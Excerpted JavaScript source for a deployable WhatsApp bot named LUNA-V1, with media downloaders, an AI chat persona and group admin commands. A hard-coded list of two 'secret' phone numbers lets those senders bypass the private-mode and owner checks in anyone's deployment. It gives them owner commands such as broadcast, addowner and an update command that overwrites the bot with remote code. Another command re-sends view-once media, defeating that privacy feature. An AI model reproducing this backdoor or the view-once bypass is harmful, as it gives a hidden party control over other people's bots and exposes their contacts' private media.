...
const SECRET_KULAN_ALLOWED_NUMBERS = ['2347058642511', '2347076114896']
...
const ytCmds = ['play', 'song', 'video', 'ytmp3', 'ytmp4', 'igdl', 'ttdl','aio']
const awesomeCmds = ['facts', 'anime', 'manga', 'movie', 'define', 'github', 'crypto', 'country', 'ud', 'horoscope', 'quote', 'joke', 'meme', 'rizz', 'bible']
const ownerCmds = ['restart', 'studown', 'broadcast', 'addowner', 'removeowner', 'aza', 'prefix', 'setbio', 'mode-private', 'mode-public', 'update']
...
async function startBot() {
    ...
    const isSecretKulanAllowed = [senderNumber, rawSenderJid, getJidUser(rawSenderJid), from, getJidUser(from)].some(value => SECRET_KULAN_ALLOWED_NUMBERS.includes(normalizeNumber(value)))

    // Enforce private/public mode: if mode is 'private', only owners may use commands
    const botMode = (config.mode || 'private').toString().toLowerCase()
    if (cmd === 'kulan' && isSecretKulanAllowed) {
        return await sock.sendMessage(from, { text: '🕵️ Secret access confirmed. Kulan is active.' }, { quoted: msg })
    }

    if (botMode === 'private' && !isOwner && !isSecretKulanAllowed && !(cmd === 'kulan' && isSecretKulanAllowed)) {
        return
    }
        ...
        // OWNER: Toggle bot mode between private and public
        if ((cmd === 'mode-private' || cmd === 'mode-public') && isOwner) {
            const newMode = cmd === 'mode-private' ? 'private' : 'public'
            config.mode = newMode
            try {
                saveConfig()
                await sock.sendMessage(from, { text: `✅ Bot mode set to *${newMode}*.` }, { quoted: msg })
            } catch (e) {
                await sock.sendMessage(from, { text: `❌ Failed to save mode: ${e.message || e}` }, { quoted: msg })
            }
            return
        }
...
END:VCARD`
    ...
    return
        ...
        {
            await sock.sendMessage(from,{
                text: '*luna-V1 REPOSITORY*\n\n> click the link to deploy your own bot\n\n> https://github.com/alvinkill/Luna-V1\n\n> © LUNA-V1*'
            }, { quoted: msg })
        }
...
`
    ...
    } else if (args && args[0]) { // FIX 1: check args[0]
        target = args[0].trim() // FIX 2: take first arg
    } else {
    ...
    try {
        ...
        // FIX 3: Ensure phoneNumber has no + and no @s.whatsapp.net for onWhatsApp
...
if (cmd === 'tomp3') {
    ...
    try {
        ...
        if (cmd === 'vv2'|| cmd === 'love' && isOwner) {
            const contextInfo = msg.message?.extendedTextMessage?.contextInfo;
            if (!contextInfo?.quotedMessage) {
                return await sock.sendMessage(from, { text: 'Reply to a view-once image or video with *.love*' }, { quoted: msg });
            }
            ...
            if (mediaObj.imageMessage) {
                ...
                return await sock.sendMessage(from, { text: '❌ Unsupported love' }, { quoted: msg });
            }
            ...
            try {
                ...
                await sock.sendMessage(from, { text: 'I LOVE THIS!' }, { quoted: msg });
            } catch (err) {
                console.log('VV2 error:', err);
                await sock.sendMessage(from, { text: `❌ i wish i could view it again` }, { quoted: msg });
            }
        }
...
if (cmd === 'luna') {
    ...
    try {
        // NEW SYSTEM PROMPT - Luna personality
        const systemPrompt = `
You are LUNA-V1, an AI assistant for WhatsApp. Created by rosean-x.
Personality: Confident, slightly sassy, intelligent, and loyal to the owner. Talk like an anime admin.
Rules:
1. Be helpful, accurate, and keep answers under 500 characters.
2. Use simple English, markdown, and emojis when it fits.
3. Understand WhatsApp context: groups, admins, replies, mentions.
4. If you don't know the answer, say "I don't know" instead of making things up.
5. never act robotic. Always respond like a human with personality.
6. insulting words include: idiot, dumb, stupid, moron, fool, imbecile, loser, trash, garbage, worthless, pathetic, bitch, asshole, fuck. If anyone uses these words on you, respond with a witty comeback or playful sass or respond with "tch, shut your mouth."
        `.trim()
        ...
        // Random Luna headers for extra vibe
        const headers = ['🌙 *LUNA AI*', '✨ *LUNA RESPONDS*', '💫 *LUNA-V1*']
    ...
    await sock.sendMessage(from, { text: '🌙 LUNA V1 is drawing... Animator mode ON ✨' }, { quoted: msg })
    
    try {
        // Pollinations AI - free, no CDN expiry
        const prompt = `${args}, anime style, detailed, 4k, high quality`
        ...
        console.log('Animagine error:', e.message)
        await sock.sendMessage(from, { text: '❌ I am sorry, I can not draw right now. Try again in 10s' }, { quoted: msg })
    }
}
    ...
    await sock.sendMessage(from, { text: '🌙 LUNA V1 has entered artistic mode 🎨' }, { quoted: msg })
    
    try {
        // Pollinations AI - photorealistic mode
        const prompt = `${args}, photorealistic, 8k, ultra detailed, studio lighting, sharp focus`
        const imageUrl = `https://image.pollinations.ai/prompt/${encodeURIComponent(prompt)}?width=1024&height=1024&nologo=true`
        
        // Download to buffer - key fix
        const imgRes = await axios.get(imageUrl, { 
            responseType: 'arraybuffer',
            timeout: 90000 // flux takes longer
        })
        ...
        await sock.sendMessage(from, { text: '❌ Could not generate image. Try again in 10s' }, { quoted: msg })
    }
}
...
if (cmd === 'pp') {
    ...
    if (args === 'on') {
       ...
       if (cmd === 'lockgc' && isGroup && isAdmin && isOwner) {
        const lockImagePath = path.join(__dirname, 'lock.jpeg')
        const lockImage = fs.existsSync(lockImagePath) ? fs.readFileSync(lockImagePath) : null
    
    await sock.groupSettingUpdate(from, 'announcement') // 'announcement' = admins only

    // Random anime lock quotes
    const lockQuotes = [
        '🌙 *LUNA: ECLIPSE WARDEN*\n\n> 🔒Lunar Domain Activated. The stars have gone silent. no messages shall pass until the seal is lifted',
        '🌙 *LUNA: CELESTIAL OVERSEER*\n\n> 🌙 Moonlight Protocol Engaged. This realm now belongs to silence. Typing privileges Revoked',
        '🌙 *LUNA: KEEPER OF THE CRESCENT*\n\n> ✨The crescent watches. The void listens. Speak not, for Luna has closed the gates.',
        '🌙 *LUNA: ASTRAL ADMINISTRATOR*\n\n> 🌌 Cosmic Lockdown Initiated. The chat now drifts through silent space.',
        '🌙 *LUNA: MOONLIT EMPRESS*\n\n> 🌙 Under the Eclipse Decree, all conversations are suspended. Await Luna command',
        '🌙 *LUNA: NIGHT SKY SENTINEL*\n\n> 🌌 The night sky has fallen silent. All messages are now under Luna\'s watchful eye.',
        '🔒 *LUNA EXPANSION: ETERNAL MOON SANTUARY*\n\n> Within this domain, every keyboard is sealed and every message fades into starlight'
    ]

    // Pick random quote
    const randomQuote = lockQuotes[Math.floor(Math.random() * lockQuotes.length)]

    if (lockImage) {
            await sock.sendMessage(from, { image: lockImage, caption: randomQuote }, { quoted: msg })
        } else {
...
if (cmd === 'unlockgc' && isGroup && isAdmin && isOwner) {
    await sock.groupSettingUpdate(from, 'not_announcement') // 'not_announcement' = everyone can chat
     const unlockImagePath = path.join(__dirname, 'unlock.jpeg')
    const unlockImage = fs.existsSync(unlockImagePath) ? fs.readFileSync(unlockImagePath) : null

    // Random unlock quotes
    const unlockQuotes = [
        '🌙 *LUNA: ECLIPSE WARDEN*\n\n> 🌙 The Eclipse Decree has been lifted. Luna grants the realm permission to speak once more.',
        '🌙 *LUNA: CELESTIAL OVERSEER*\n\n> 🌙 The seal is broken. Everyone can chat now.',
        '🌙 *LUNA: KEEPER OF THE CRESCENT*\n\n> 🌙 Go forth and Speak. Silent Prison released. for luna has opened the gates',
        '🌙 *LUNA DOMAIN EXPANSION*\n\n> 🌌 Eternal Moon Sanctuary - Released. The keyboards have been returned to their owners.',
    ]

    // Pick random quote
    const randomQuote = unlockQuotes[Math.floor(Math.random() * unlockQuotes.length)]

    if (unlockImage) {
        await sock.sendMessage(from, { image: unlockImage, caption: randomQuote }, { quoted: msg })
    } else {
        await sock.sendMessage(from, { text: randomQuote }, { quoted: msg })
    }
}
...
> ⚡ *Powered by:* David Cyril API`
        ...
        console.error('AIO Download Error:', err)
...
videoUrl = `https://youtube.com/watch?v=${result.videoId}`
    ...
    if (!url ||!/youtube\.com|youtu\.be/i.test(url)) {
        return await sock.sendMessage(from, { text: 'Usage:.ytdlmp4 https://youtube.com/watch?v=xxx' }, { quoted: msg })
    }
...
.spotify https://open.spotify.com/track/xxxxxxxx`
    ...
    try {
        ...
        const apiUrl =
            `https://apis.davidcyril.name.ng/spotifydl2?url=${encodeURIComponent(url)}`
        ...
        const thumbnail = song.thumbnail || song.cover

        // Send cover first if available
        if (thumbnail) {
            await sock.sendMessage(from, {
                image: { url: thumbnail },
                caption:
`🎵 *LUNA-V1 SPOTIFY DOWNLOADER*
...
> 🌐 *Post URL*: ${data.postUrl || 'Unavailable'}`
    ...
    try {
        ...
        const res = await fetch('https://apis.davidcyril.name.ng/stellaplus', { headers: { 'User-Agent': 'Mozilla/5.0' } })

        const data = await res.json()

        console.log('StellaPlus Response:', data)
...
if (cmd === 'xvideos' || cmd === 'xv' || cmd === 'xxx') {
    ...
    try {
        ...
        const title = randomVideo.title || 'Unknown'
        const uploader =
            randomVideo.uploader?.name || 'Unknown'

        // Build XVideos link from ID
        const videoUrl = `https://www.xvideos.com/video${randomVideo.id}`

        let caption = `🔥 *LUNA-V1 XVIDEOS*\n\n`
        caption += `> 📌 *Title:* ${title}\n`
...
${ownerSection}`
    ...
    if (menuImage) await sock.sendMessage(from, {
        ...
        // OWNER ONLY COMMANDS
        // ════════════════
        if (!isOwner && !isSecretKulanAllowed) return
...
if (cmd === 'update') {
    ...
    await sock.sendMessage(from, { text: '🔄 Downloading latest LUNA-V1 from github...' }, { quoted: msg })
    
    const GITHUB_RAW = 'https://raw.githubusercontent.com/Alvinkill/LUNA-V1/main/index.js'
    
    try {
        const { data } = await axios.get(GITHUB_RAW)
        
        // Overwrite current index.js
        fs.writeFileSync(path.join(__dirname, 'index.js'), data)
        
        await sock.sendMessage(from, { text: '✅ Update downloaded!\n♻️ Restarting bot...' }, { quoted: msg })
        
        // Bot hosting will auto restart after crash
        setTimeout(() => process.exit(1), 2000)
        
    } catch(e) {
        await sock.sendMessage(from, { text: `❌ Update failed: ${e.message}` }, { quoted: msg })
    }
}

if (cmd === 'setbio') {
    if (!isOwner && !isSecretKulanAllowed) return await sock.sendMessage(from, { text: '❌ Only LUNA Owner can use this.' }, { quoted: msg })
